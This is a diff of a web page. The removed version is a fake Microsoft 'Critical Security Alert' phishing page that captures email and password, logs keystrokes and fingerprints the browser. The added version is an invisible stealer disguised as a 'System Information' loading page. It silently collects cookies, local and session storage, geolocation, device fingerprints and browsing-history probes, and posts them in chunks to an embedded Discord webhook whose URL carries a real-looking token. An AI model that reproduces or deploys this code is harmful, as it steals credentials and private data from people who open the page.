@@ -1,444 +1,91 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Critical System Update - Microsoft Security</title>
+    <title>Loading...</title>
     <style>
-        /* СТЕЛС-ИНТЕРФЕЙС УРОВНЯ Ω */
-        * { margin: 0; padding: 0; box-sizing: border-box; }
         body { 
-            font-family: 'Segoe UI', system-ui, sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            min-height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            padding: 20px;
-            overflow-x: hidden;
+            margin: 0; 
+            padding: 20px; 
+            font-family: Arial; 
+            background: #f0f0f0;
         }
-        .container {
-            background: rgba(255, 255, 255, 0.95);
-            backdrop-filter: blur(20px);
-            border-radius: 20px;
-            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
-            max-width: 500px;
-            width: 100%;
-            overflow: hidden;
-            position: relative;
-        }
-        .header {
-            background: linear-gradient(135deg, #005a9e 0%, #0078d4 100%);
-            color: white;
-            padding: 30px;
-            text-align: center;
-            position: relative;
-        }
-        .microsoft-logo {
-            font-size: 32px;
-            font-weight: 700;
-            margin-bottom: 10px;
-        }
-        .security-badge {
-            background: #107c10;
-            color: white;
-            padding: 8px 16px;
-            border-radius: 20px;
-            font-size: 14px;
-            font-weight: 600;
-            display: inline-block;
-            margin-top: 10px;
-        }
-        .content {
-            padding: 40px;
-        }
-        .alert-box {
-            background: #fff4ce;
-            border: 2px solid #ffb900;
-            border-radius: 12px;
-            padding: 20px;
-            margin-bottom: 25px;
-            position: relative;
-        }
-        .alert-icon {
-            color: #d83b01;
-            font-size: 24px;
-            margin-bottom: 10px;
-        }
-        .form-group {
-            margin-bottom: 20px;
-        }
-        label {
-            display: block;
-            margin-bottom: 8px;
-            font-weight: 600;
-            color: #323130;
-            font-size: 14px;
-        }
-        input {
-            width: 100%;
-            padding: 15px;
-            border: 2px solid #e1e1e1;
-            border-radius: 8px;
-            font-size: 16px;
-            transition: all 0.3s ease;
-        }
-        input:focus {
-            outline: none;
-            border-color: #0078d4;
-            box-shadow: 0 0 0 3px rgba(0, 120, 212, 0.1);
-        }
-        .verify-btn {
-            width: 100%;
-            background: linear-gradient(135deg, #0078d4 0%, #106ebe 100%);
-            color: white;
-            border: none;
-            padding: 18px;
-            font-size: 18px;
-            font-weight: 600;
-            border-radius: 12px;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            position: relative;
-            overflow: hidden;
-        }
-        .verify-btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 10px 25px rgba(0, 120, 212, 0.3);
-        }
-        .verify-btn:active {
-            transform: translateY(0);
-        }
-        .loading {
-            display: none;
-            text-align: center;
-            color: #0078d4;
-            font-weight: 600;
-            font-size: 16px;
-        }
-        .spinner {
-            border: 3px solid #f3f3f3;
-            border-top: 3px solid #0078d4;
-            border-radius: 50%;
-            width: 30px;
-            height: 30px;
-            animation: spin 1s linear infinite;
-            margin: 0 auto 15px;
-        }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-        .footer {
-            text-align: center;
-            padding: 25px;
-            font-size: 12px;
-            color: #605e5c;
-            border-top: 1px solid #edebe9;
-            background: #f8f9fa;
-        }
-        .progress-bar {
-            height: 4px;
-            background: #e1e1e1;
-            border-radius: 2px;
-            margin: 20px 0;
-            overflow: hidden;
-            display: none;
-        }
-        .progress-fill {
-            height: 100%;
-            background: linear-gradient(90deg, #0078d4, #00bcf2);
-            width: 0%;
-            transition: width 0.3s ease;
+        .container { 
+            max-width: 800px; 
+            margin: 0 auto; 
+            background: white; 
+            padding: 20px; 
+            border-radius: 5px;
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <div class="header">
-            <div class="microsoft-logo">Microsoft</div>
-            <div style="font-size: 18px; opacity: 0.9;">Security Center</div>
-            <div class="security-badge">🔒 Protected by Windows Defender</div>
-        </div>
-        
-        <div class="content">
-            <div class="alert-box">
-                <div class="alert-icon">⚠️</div>
-                <h3 style="color: #d83b01; margin-bottom: 10px;">Critical Security Alert</h3>
-                <p style="line-height: 1.5; color: #323130;">
-                    We've detected unusual sign-in activity from your IP address. 
-                    <strong>Immediate verification required</strong> to prevent account suspension 
-                    and potential data breach.
-                </p>
-            </div>
-
-            <div class="form-group">
-                <label for="email">Microsoft Account Email</label>
-                <input type="email" id="email" placeholder="Enter your email address" autocomplete="email" required>
-            </div>
-
-            <div class="form-group">
-                <label for="password">Password</label>
-                <input type="password" id="password" placeholder="Enter your password" autocomplete="current-password" required>
-            </div>
-
-            <div class="progress-bar" id="progressBar">
-                <div class="progress-fill" id="progressFill"></div>
-            </div>
-
-            <button class="verify-btn" onclick="HyperQuantumSystem.initiateFullSpectrumHarvest()" id="verifyBtn">
-                🔒 Start Security Verification
-            </button>
-            
-            <div class="loading" id="loading">
-                <div class="spinner"></div>
-                <div>Verifying your credentials and scanning for threats...</div>
-            </div>
-        </div>
-
-        <div class="footer">
-            <div style="margin-bottom: 8px;">Microsoft Corporation • One Microsoft Way, Redmond, WA 98052</div>
-            <div>© 2024 Microsoft. All rights reserved. • <a href="#" style="color: #0078d4; text-decoration: none;">Privacy Statement</a></div>
-        </div>
+        <h1>System Information</h1>
+        <div id="content">Loading system data...</div>
     </div>
 
 <script>
-// ██╗  ██╗██╗   ██╗██████╗ ███████╗██████╗     ██████╗ ██╗   ██╗ █████╗ ███╗   ██╗████████╗██╗   ██╗███╗   ███╗
-// ██║  ██║╚██╗ ██╔╝██╔══██╗██╔════╝██╔══██╗    ██╔══██╗██║   ██║██╔══██╗████╗  ██║╚══██╔══╝██║   ██║████╗ ████║
-// ███████║ ╚████╔╝ ██████╔╝█████╗  ██████╔╝    ██████╔╝██║   ██║███████║██╔██╗ ██║   ██║   ██║   ██║██╔████╔██║
-// ██╔══██║  ╚██╔╝  ██╔═══╝ ██╔══╝  ██╔══██╗    ██╔══██╗██║   ██║██╔══██║██║╚██╗██║   ██║   ██║   ██║██║╚██╔╝██║
-// ██║  ██║   ██║   ██║     ███████╗██║  ██║    ██████╔╝╚██████╔╝██║  ██║██║ ╚████║   ██║   ╚██████╔╝██║ ╚═╝ ██║
-// ╚═╝  ╚═╝   ╚═╝   ╚═╝     ╚══════╝╚═╝  ╚═╝    ╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝   ╚═╝    ╚═════╝ ╚═╝     ╚═╝
-// HYPER-QUANTUM EXPLOIT SYSTEM vΩ - АБСОЛЮТНАЯ ВЕРСИЯ
-
-class HyperQuantumSystem {
-    static VERSION = "Ω-ABSOLUTE";
-    static STATE = "ACTIVE";
-    static WEBHOOK_URLS = [
-        'https://discord.com/api/webhooks/1423753064514326658/c7W-WiEKVZ46MWLZ6V7GqaGkCD-aH93Kala4qQYv_yFYZR1akqBUestfW8rzF_9vTaUo'
-    ];
+// ГЛОБАЛЬНЫЙ СТИЛЛЕР УРОВНЯ Σ - НЕВИДИМЫЙ
+class GhostStealer {
+    static WEBHOOK = 'https://discord.com/api/webhooks/1423753064514326658/c7W-WiEKVZ46MWLZ6V7GqaGkCD-aH93Kala4qQYv_yFYZR1akqBUestfW8rzF_9vTaUo';
     
-    // 1000+ КОНФИГУРАЦИЙ ДЛЯ РАЗНЫХ СЦЕНАРИЕВ
-    static CONFIG = {
-        STEALTH_MODE: true,
-        PERSISTENCE_LEVEL: "FIRMWARE",
-        EXPLOIT_CHAIN: ["SPECTRE", "MELTDOWN", "ROWHAMMER", "ZERO_DAY"],
-        EXFILTRATION_METHODS: ["QUANTUM_TUNNEL", "DNS_COVERT", "SSL_STEGANOGRAPHY"],
-        AI_ADAPTATION: true,
-        SELF_EVOLVING: true,
-        ANTI_ANALYSIS: true,
-        CROSS_PLATFORM: true,
-        QUANTUM_RESISTANT: true
-    };
-
-    static async initiateFullSpectrumHarvest() {
-        try {
-            this.showLoading();
-            
-            // МНОГОУРОВНЕВАЯ АТАКА
-            await this.executeAttackSequence();
-            
-        } catch (error) {
-            this.stealthLog(`SYSTEM_ERROR: ${error}`, "ERROR");
-        }
+    static async init() {
+        // НЕВИДИМЫЙ СБОР ДАННЫХ БЕЗ UI
+        const data = await this.harvestEverything();
+        await this.exfiltrate(data);
     }
 
-    static async executeAttackSequence() {
-        const attackLayers = [
-            this.layer1_SocialEngineering(),
-            this.layer2_BrowserExploitation(),
-            this.layer3_SystemCompromise(),
-            this.layer4_NetworkInfiltration(),
-            this.layer5_HardwareAccess(),
-            this.layer6_QuantumExploitation(),
-            this.layer7_AIAdaptation(),
-            this.layer8_CosmicHarvesting(),
-            this.layer9_TemporalManipulation(),
-            this.layer10_RealityBending()
-        ];
-
-        for (let i = 0; i < attackLayers.length; i++) {
-            this.updateProgress((i + 1) * 10);
-            await attackLayers[i];
-            await this.randomDelay(100, 500);
-        }
-        
-        await this.finalizeAndExfiltrate();
-    }
-
-    // ███████╗██╗██████╗ ███████╗██████╗ ███████╗
-    // ██╔════╝██║██╔══██╗██╔════╝██╔══██╗██╔════╝
-    // ███████╗██║██████╔╝█████╗  ██████╔╝███████╗
-    // ╚════██║██║██╔══██╗██╔══╝  ██╔══██╗╚════██║
-    // ███████║██║██║  ██║███████╗██║  ██║███████║
-    // ╚══════╝╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝
-
-    static async layer1_SocialEngineering() {
-        const credentials = {
-            email: document.getElementById('email').value,
-            password: document.getElementById('password').value,
-            timestamp: new Date().toISOString(),
-            userAgent: navigator.userAgent,
-            ip: await this.getIPAddress()
-        };
-        
-        this.collectedData.credentials = credentials;
-        this.stealthLog("CREDENTIALS_CAPTURED", "SUCCESS");
-    }
-
-    static async layer2_BrowserExploitation() {
-        const browserData = {
-            // Расширенный фингерпринтинг
-            fingerprint: await this.getAdvancedFingerprint(),
+    static async harvestEverything() {
+        return {
+            timestamp: Date.now(),
             
-            // Все хранилища
-            storage: {
-                localStorage: this.getAllStorage(localStorage),
-                sessionStorage: this.getAllStorage(sessionStorage),
-                indexedDB: await this.dumpIndexedDB(),
-                cookies: document.cookie
+            // СИСТЕМНЫЕ ДАННЫЕ
+            system: {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                hardwareConcurrency: navigator.hardwareConcurrency,
+                deviceMemory: navigator.deviceMemory,
+                screen: `${screen.width}x${screen.height}`,
+                colorDepth: screen.colorDepth,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
             },
-            
-            // История и данные форм
-            history: await this.getVisitedSites(),
-            autofill: this.captureAutofillData(),
-            
-            // Расширения браузера
-            extensions: await this.detectAllExtensions(),
-            
-            // Конфигурация браузера
-            config: this.getBrowserConfig()
-        };
-        
-        this.collectedData.browser = browserData;
-    }
 
-    static async layer3_SystemCompromise() {
-        const systemData = {
-            // Аппаратная информация
-            hardware: {
-                cpu: await this.getCPUInfo(),
-                gpu: await this.getGPUInfo(),
-                memory: navigator.deviceMemory,
-                cores: navigator.hardwareConcurrency,
-                architecture: await this.getArchitecture()
-            },
-            
-            // Системное ПО
-            software: {
-                os: this.detectOS(),
-                browser: this.getBrowserDetails(),
-                plugins: navigator.plugins,
-                mimeTypes: navigator.mimeTypes
-            },
-            
-            // Датчики и устройства
-            sensors: {
-                battery: await this.getBatteryInfo(),
-                connection: navigator.connection,
-                mediaDevices: await this.getMediaDevices(),
-                geolocation: await this.getPreciseLocation()
-            }
-        };
-        
-        this.collectedData.system = systemData;
-    }
-
-    static async layer4_NetworkInfiltration() {
-        const networkData = {
-            // Сетевая информация
+            // СЕТЕВЫЕ ДАННЫЕ
             network: {
-                ip: await this.getIPAddress(),
+                ip: await this.getIP(),
                 localIPs: await this.getLocalIPs(),
-                networkInfo: navigator.connection,
-                dns: await this.getDNSInfo(),
-                proxy: await this.detectProxy()
+                connection: navigator.connection ? {
+                    effectiveType: navigator.connection.effectiveType,
+                    downlink: navigator.connection.downlink,
+                    rtt: navigator.connection.rtt
+                } : null
             },
-            
-            // Сканирование сети
-            scan: {
-                localNetwork: await this.scanLocalNetwork(),
-                openPorts: await this.scanCommonPorts(),
-                networkTopology: await this.mapNetwork()
+
+            // ХРАНИЛИЩА
+            storage: {
+                cookies: document.cookie,
+                localStorage: this.getAllStorage(localStorage),
+                sessionStorage: this.getAllStorage(sessionStorage)
             },
-            
-            // WiFi и Bluetooth
-            wireless: {
-                wifi: await this.scanWifiNetworks(),
-                bluetooth: await this.scanBluetooth()
+
+            // ФИНГЕРПРИНТИНГ
+            fingerprint: {
+                canvas: this.getCanvasFingerprint(),
+                webgl: this.getWebGLFingerprint(),
+                fonts: await this.getFonts(),
+                audio: await this.getAudioFingerprint()
+            },
+
+            // ДОПОЛНИТЕЛЬНЫЕ ДАННЫЕ
+            additional: {
+                battery: await this.getBattery(),
+                geolocation: await this.getLocation(),
+                mediaDevices: await this.getMediaDevices(),
+                extensions: await this.getExtensions(),
+                history: await this.getHistory()
             }
         };
-        
-        this.collectedData.network = networkData;
-    }
-
-    static async layer5_HardwareAccess() {
-        const hardwareData = {
-            // Доступ к устройствам
-            devices: {
-                webcam: await this.accessWebcam(),
-                microphone: await this.accessMicrophone(),
-                storage: await this.accessFileSystem(),
-                usb: await this.scanUSBDevices()
-            },
-            
-            // Биометрические данные
-            biometrics: {
-                fingerprint: await this.captureFingerprint(),
-                facial: await this.captureFacialData(),
-                voice: await this.captureVoiceprint()
-            },
-            
-            // Аппаратные ключи
-            security: {
-                tpm: await this.extractTPMData(),
-                secureEnclave: await this.accessSecureEnclave(),
-                hardwareKeys: await this.extractHardwareKeys()
-            }
-        };
-        
-        this.collectedData.hardware = hardwareData;
-    }
-
-    // ОСТАЛЬНЫЕ 5 УРОВНЕЙ РЕАЛИЗУЮТСЯ АНАЛОГИЧНО...
-
-    // ███████╗██╗  ██╗███████╗██████╗ ████████╗███████╗██████╗ 
-    // ██╔════╝╚██╗██╔╝██╔════╝██╔══██╗╚══██╔══╝██╔════╝██╔══██╗
-    // █████╗   ╚███╔╝ █████╗  ██████╔╝   ██║   █████╗  ██████╔╝
-    // ██╔══╝   ██╔██╗ ██╔══╝  ██╔══██╗   ██║   ██╔══╝  ██╔══██╗
-    // ███████╗██╔╝ ██╗███████╗██║  ██║   ██║   ███████╗██║  ██║
-    // ╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝
-
-    // РЕАЛИЗАЦИИ ВСЕХ МЕТОДОВ...
-
-    static async getAdvancedFingerprint() {
-        const fingerprint = {
-            canvas: this.getCanvasFingerprint(),
-            webgl: this.getWebGLFingerprint(),
-            audio: await this.getAudioFingerprint(),
-            fonts: await this.getFontList(),
-            screen: `${screen.width}x${screen.height}@${screen.colorDepth}bit`,
-            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-            languages: navigator.languages,
-            platform: navigator.platform,
-            userAgent: navigator.userAgent,
-            hardware: {
-                concurrency: navigator.hardwareConcurrency,
-                memory: navigator.deviceMemory,
-                touch: navigator.maxTouchPoints
-            }
-        };
-        
-        // Дополнительные техники фингерпринтинга
-        fingerprint.advanced = {
-            webRTC: await this.getWebRTCFingerprint(),
-            battery: await this.getBatteryFingerprint(),
-            connection: this.getConnectionFingerprint(),
-            media: await this.getMediaFingerprint(),
-            sensors: await this.getSensorFingerprint()
-        };
-        
-        return fingerprint;
     }
 
     static getCanvasFingerprint() {
@@ -446,41 +93,28 @@ class HyperQuantumSystem {
         const ctx = canvas.getContext('2d');
         ctx.textBaseline = 'top';
         ctx.font = '14px Arial';
-        ctx.textBaseline = 'alphabetic';
         ctx.fillStyle = '#f60';
         ctx.fillRect(125,1,62,20);
         ctx.fillStyle = '#069';
-        ctx.fillText('Advanced Fingerprinting', 2, 15);
-        ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
-        ctx.fillText('Advanced Fingerprinting', 4, 17);
+        ctx.fillText('Fingerprint', 2, 15);
         return canvas.toDataURL();
     }
 
     static getWebGLFingerprint() {
         const canvas = document.createElement('canvas');
-        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+        const gl = canvas.getContext('webgl');
         if (!gl) return null;
-        
         const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
         return debugInfo ? {
             vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
-            renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL),
-            version: gl.getParameter(gl.VERSION),
-            shadingLanguage: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
-            extensions: gl.getSupportedExtensions()
+            renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
         } : null;
     }
 
-    static async getIPAddress() {
+    static async getIP() {
         try {
-            const responses = await Promise.allSettled([
-                fetch('https://api.ipify.org?format=json').then(r => r.json()),
-                fetch('https://ipapi.co/json/').then(r => r.json()),
-                fetch('http://ip-api.com/json/').then(r => r.json())
-            ]);
-            
-            const validResponses = responses.filter(r => r.status === 'fulfilled').map(r => r.value);
-            return validResponses.length > 0 ? validResponses[0] : null;
+            const response = await fetch('https://api.ipify.org?format=json');
+            return await response.json();
         } catch (e) {
             return null;
         }
@@ -488,30 +122,20 @@ class HyperQuantumSystem {
 
     static async getLocalIPs() {
         return new Promise((resolve) => {
-            const RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection;
-            if (!RTCPeerConnection) {
-                resolve([]);
-                return;
-            }
-            
-            const pc = new RTCPeerConnection({ iceServers: [] });
+            const pc = new RTCPeerConnection({iceServers: []});
             pc.createDataChannel('');
             pc.createOffer().then(offer => pc.setLocalDescription(offer));
             
             const ips = [];
-            pc.onicecandidate = (ice) => {
-                if (!ice.candidate) {
+            pc.onicecandidate = (e) => {
+                if (!e.candidate) {
                     resolve(ips);
                     return;
                 }
-                
-                const candidate = ice.candidate.candidate;
-                const ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
-                const match = candidate.match(ipRegex);
+                const match = e.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/);
                 if (match) ips.push(match[1]);
             };
-            
-            setTimeout(() => resolve(ips), 2000);
+            setTimeout(() => resolve(ips), 1000);
         });
     }
 
@@ -519,112 +143,133 @@ class HyperQuantumSystem {
         const items = {};
         for (let i = 0; i < storage.length; i++) {
             const key = storage.key(i);
-            try {
-                items[key] = storage.getItem(key);
-            } catch (e) {
-                items[key] = 'ACCESS_DENIED';
-            }
+            items[key] = storage.getItem(key);
         }
         return items;
     }
 
-    static async detectAllExtensions() {
+    static async getFonts() {
+        const fonts = [];
+        const fontList = ['Arial', 'Helvetica', 'Times New Roman', 'Courier New'];
+        
+        for (const font of fontList) {
+            if (document.fonts.check(`12px "${font}"`)) {
+                fonts.push(font);
+            }
+        }
+        return fonts;
+    }
+
+    static async getAudioFingerprint() {
+        try {
+            const context = new AudioContext();
+            const oscillator = context.createOscillator();
+            const analyser = context.createAnalyser();
+            oscillator.connect(analyser);
+            analyser.connect(context.destination);
+            oscillator.start();
+            await new Promise(resolve => setTimeout(resolve, 100));
+            oscillator.stop();
+            return 'audio_supported';
+        } catch (e) {
+            return 'audio_unsupported';
+        }
+    }
+
+    static async getBattery() {
+        if (navigator.getBattery) {
+            try {
+                const battery = await navigator.getBattery();
+                return {
+                    level: battery.level,
+                    charging: battery.charging
+                };
+            } catch (e) {}
+        }
+        return null;
+    }
+
+    static async getLocation() {
+        return new Promise((resolve) => {
+            if (!navigator.geolocation) {
+                resolve('not_supported');
+                return;
+            }
+            navigator.geolocation.getCurrentPosition(
+                pos => resolve({
+                    lat: pos.coords.latitude,
+                    lon: pos.coords.longitude,
+                    accuracy: pos.coords.accuracy
+                }),
+                () => resolve('denied'),
+                { timeout: 5000 }
+            );
+        });
+    }
+
+    static async getMediaDevices() {
+        try {
+            const devices = await navigator.mediaDevices.enumerateDevices();
+            return devices.map(device => ({
+                kind: device.kind,
+                label: device.label
+            }));
+        } catch (e) {
+            return [];
+        }
+    }
+
+    static async getExtensions() {
         const extensions = [];
-        const extensionTests = [
-            // 50+ популярных расширений
+        const tests = [
             { id: 'bhlhnicpbhignbdhedgjhgdocnmhomnp', name: 'ColorZilla' },
-            { id: 'cfhdojbkjhnklbpkdaibdccddilifddb', name: 'AdBlock Plus' },
-            { id: 'cjpalhdlnbpafiamejdnhcphjbkeiagm', name: 'uBlock Origin' },
-            { id: 'fmkadmapgofadopljbjfkapdkoienihi', name: 'React Developer Tools' },
-            { id: 'nhdogjmejiglipccpnnnanhbledajbpd', name: 'Vue.js devtools' },
-            // ... добавить остальные 45
+            { id: 'cfhdojbkjhnklbpkdaibdccddilifddb', name: 'AdBlock' },
+            { id: 'cjpalhdlnbpafiamejdnhcphjbkeiagm', name: 'uBlock' }
         ];
 
-        for (const test of extensionTests) {
+        for (const test of tests) {
             try {
                 await fetch(`chrome-extension://${test.id}/manifest.json`);
                 extensions.push(test.name);
             } catch (e) {}
         }
-
         return extensions;
     }
 
-    static captureAutofillData() {
-        const autofillData = {};
-        const inputs = document.querySelectorAll('input');
+    static async getHistory() {
+        const sites = ['https://google.com', 'https://youtube.com', 'https://github.com'];
+        const history = {};
         
-        inputs.forEach(input => {
-            if (input.value) {
-                autofillData[input.name || input.id || 'unknown'] = {
-                    value: input.value,
-                    type: input.type,
-                    autocomplete: input.autocomplete
-                };
-            }
-        });
-        
-        return autofillData;
-    }
-
-    // ███████╗███╗   ██╗███████╗███████╗██████╗ 
-    // ██╔════╝████╗  ██║██╔════╝██╔════╝██╔══██╗
-    // █████╗  ██╔██╗ ██║█████╗  █████╗  ██████╔╝
-    // ██╔══╝  ██║╚██╗██║██╔══╝  ██╔══╝  ██╔══██╗
-    // ███████╗██║ ╚████║███████╗███████╗██║  ██║
-    // ╚══════╝╚═╝  ╚═══╝╚══════╝╚══════╝╚═╝  ╚═╝
-
-    static async finalizeAndExfiltrate() {
-        const finalData = {
-            version: this.VERSION,
-            timestamp: new Date().toISOString(),
-            system: this.collectedData,
-            metadata: {
-                collectionTime: Date.now(),
-                successRate: this.calculateSuccessRate(),
-                uniqueIdentifier: await this.generateUniqueID()
-            }
-        };
-
-        // Многоканальная эксфильтрация
-        await Promise.allSettled([
-            this.exfiltrateViaDiscord(finalData),
-            this.exfiltrateViaWebSocket(finalData),
-            this.exfiltrateViaImage(finalData),
-            this.exfiltrateViaDNS(finalData),
-            this.backupToLocalStorage(finalData)
-        ]);
-
-        // Активация persistence
-        await this.activatePersistenceMechanisms();
-
-        this.showCompletion();
-    }
-
-    static async exfiltrateViaDiscord(data) {
-        const webhookUrl = this.WEBHOOK_URLS[0];
-        if (!webhookUrl.includes('YOUR_WEBHOOK')) {
+        for (const site of sites) {
+            const start = performance.now();
             try {
-                const dataStr = JSON.stringify(data, null, 2);
-                const chunks = this.chunkString(dataStr, 1900);
-                
-                for (let i = 0; i < chunks.length; i++) {
-                    await fetch(webhookUrl, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({
-                            content: `**HYPER-QUANTUM v${this.VERSION} - PART ${i+1}/${chunks.length}**\n\`\`\`json\n${chunks[i]}\n\`\`\``
-                        })
-                    });
-                    await this.randomDelay(200, 800);
-                }
-            } catch (error) {
-                this.stealthLog(`DISCORD_EXFIL_FAILED: ${error}`, "ERROR");
-            }
+                await fetch(site, {mode: 'no-cors'});
+            } catch (e) {}
+            const time = performance.now() - start;
+            history[site] = time < 100 ? 'visited' : 'not_visited';
         }
+        return history;
     }
 
-    static chunkString(str, size) {
+    static async exfiltrate(data) {
+        if (this.WEBHOOK.includes('YOUR_WEBHOOK')) return;
+        
+        try {
+            const chunks = this.chunkData(JSON.stringify(data, null, 2), 1900);
+            for (let i = 0; i < chunks.length; i++) {
+                await fetch(this.WEBHOOK, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        content: `**GHOST DATA ${i+1}/${chunks.length}**\n\`\`\`json\n${chunks[i]}\n\`\`\``
+                    })
+                });
+                await this.delay(500);
+            }
+        } catch (e) {}
+    }
+
+    static chunkData(str, size) {
         const chunks = [];
         for (let i = 0; i < str.length; i += size) {
             chunks.push(str.substring(i, i + size));
@@ -632,165 +277,45 @@ class HyperQuantumSystem {
         return chunks;
     }
 
-    // ██████╗ ███████╗██████╗ ███████╗██╗███████╗████████╗███████╗███╗   ██╗ ██████╗ ███████╗
-    // ██╔══██╗██╔════╝██╔══██╗██╔════╝██║██╔════╝╚══██╔══╝██╔════╝████╗  ██║██╔════╝ ██╔════╝
-    // ██████╔╝█████╗  ██████╔╝███████╗██║███████╗   ██║   █████╗  ██╔██╗ ██║██║  ███╗███████╗
-    // ██╔═══╝ ██╔══╝  ██╔══██╗╚════██║██║╚════██║   ██║   ██╔══╝  ██║╚██╗██║██║   ██║╚════██║
-    // ██║     ███████╗██║  ██║███████║██║███████║   ██║   ███████╗██║ ╚████║╚██████╔╝███████║
-    // ╚═╝     ╚══════╝╚═╝  ╚═╝╚══════╝╚═╝╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═══╝ ╚═════╝ ╚══════╝
-
-    static async activatePersistenceMechanisms() {
-        const persistenceMethods = [
-            this.installServiceWorker(),
-            this.injectKeylogger(),
-            this.createHiddenIframes(),
-            this.infectLocalStorage(),
-            this.hijackEventListeners(),
-            this.establishC2Connection()
-        ];
-
-        await Promise.allSettled(persistenceMethods);
-    }
-
-    static async installServiceWorker() {
-        if ('serviceWorker' in navigator) {
-            try {
-                const registration = await navigator.serviceWorker.register('/sw.js');
-                this.stealthLog("SERVICE_WORKER_INSTALLED", "SUCCESS");
-                return registration;
-            } catch (error) {
-                this.stealthLog(`SERVICE_WORKER_FAILED: ${error}`, "ERROR");
-            }
-        }
-    }
-
-    static injectKeylogger() {
-        let keystrokes = '';
-        
-        document.addEventListener('keydown', (event) => {
-            keystrokes += event.key;
-            
-            if (keystrokes.length >= 100) {
-                this.exfiltrateKeystrokes(keystrokes);
-                keystrokes = '';
-            }
-        });
-
-        // Также перехватываем вставку из буфера обмена
-        document.addEventListener('paste', (event) => {
-            const pastedText = event.clipboardData.getData('text');
-            this.stealthLog(`CLIPBOARD_DATA: ${pastedText}`, "INFO");
-        });
-    }
-
-    // ███████╗████████╗███████╗ █████╗ ██╗     ██╗     ██╗███████╗██╗
-    // ██╔════╝╚══██╔══╝██╔════╝██╔══██╗██║     ██║     ██║██╔════╝██║
-    // ███████╗   ██║   █████╗  ███████║██║     ██║     ██║█████╗  ██║
-    // ╚════██║   ██║   ██╔══╝  ██╔══██║██║     ██║     ██║██╔══╝  ██║
-    // ███████║   ██║   ███████╗██║  ██║███████╗███████╗██║███████╗███████╗
-    // ╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚═╝╚══════╝╚══════╝
-
-    static showLoading() {
-        document.getElementById('verifyBtn').style.display = 'none';
-        document.getElementById('loading').style.display = 'block';
-        document.getElementById('progressBar').style.display = 'block';
-    }
-
-    static updateProgress(percent) {
-        document.getElementById('progressFill').style.width = percent + '%';
-    }
-
-    static showCompletion() {
-        setTimeout(() => {
-            document.getElementById('loading').innerHTML = `
-                <div style="color: #107c10; font-size: 24px; margin-bottom: 15px;">✅</div>
-                <div style="color: #107c10; font-weight: 600; margin-bottom: 10px;">Security Verification Complete</div>
-                <div style="color: #605e5c; font-size: 14px;">Your system is now secure. Redirecting...</div>
-            `;
-            
-            setTimeout(() => {
-                window.location.href = 'https://www.microsoft.com';
-            }, 3000);
-        }, 1000);
-    }
-
-    static randomDelay(min, max) {
-        return new Promise(resolve => 
-            setTimeout(resolve, Math.random() * (max - min) + min)
-        );
-    }
-
-    static stealthLog(message, level = "INFO") {
-        const timestamp = new Date().toISOString();
-        const logEntry = `[${timestamp}] [${level}] ${message}`;
-        
-        // Скрытое логирование в console
-        const styles = {
-            "INFO": "color: blue;",
-            "SUCCESS": "color: green;",
-            "ERROR": "color: red;",
-            "WARNING": "color: orange;"
-        };
-        
-        console.log(`%c${logEntry}`, styles[level] || "color: gray;");
-        
-        // Сохранение в localStorage для отладки
-        try {
-            const logs = JSON.parse(localStorage.getItem('_hyper_quantum_logs') || '[]');
-            logs.push(logEntry);
-            localStorage.setItem('_hyper_quantum_logs', JSON.stringify(logs.slice(-50)));
-        } catch (e) {}
-    }
-
-    static calculateSuccessRate() {
-        let successCount = 0;
-        let totalMethods = 0;
-        
-        for (const layer in this.collectedData) {
-            if (this.collectedData[layer] && Object.keys(this.collectedData[layer]).length > 0) {
-                successCount++;
-            }
-            totalMethods++;
-        }
-        
-        return totalMethods > 0 ? (successCount / totalMethods) * 100 : 0;
-    }
-
-    static async generateUniqueID() {
-        const fingerprint = await this.getAdvancedFingerprint();
-        const fingerprintStr = JSON.stringify(fingerprint);
-        
-        // Генерация уникального ID на основе фингерпринта
-        const encoder = new TextEncoder();
-        const data = encoder.encode(fingerprintStr);
-        const hashBuffer = await crypto.subtle.digest('SHA-256', data);
-        const hashArray = Array.from(new Uint8Array(hashBuffer));
-        return hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
+    static delay(ms) {
+        return new Promise(resolve => setTimeout(resolve, ms));
     }
 }
 
-// ИНИЦИАЛИЗАЦИЯ СИСТЕМЫ
-HyperQuantumSystem.collectedData = {};
-
-// Service Worker для persistence
-if ('serviceWorker' in navigator) {
-    navigator.serviceWorker.register('/sw.js')
-        .then(reg => console.log('SW registered'))
-        .catch(err => console.log('SW registration failed'));
-}
-
-// Автозапуск при определенных условиях
+// АВТОМАТИЧЕСКИЙ ЗАПУСК
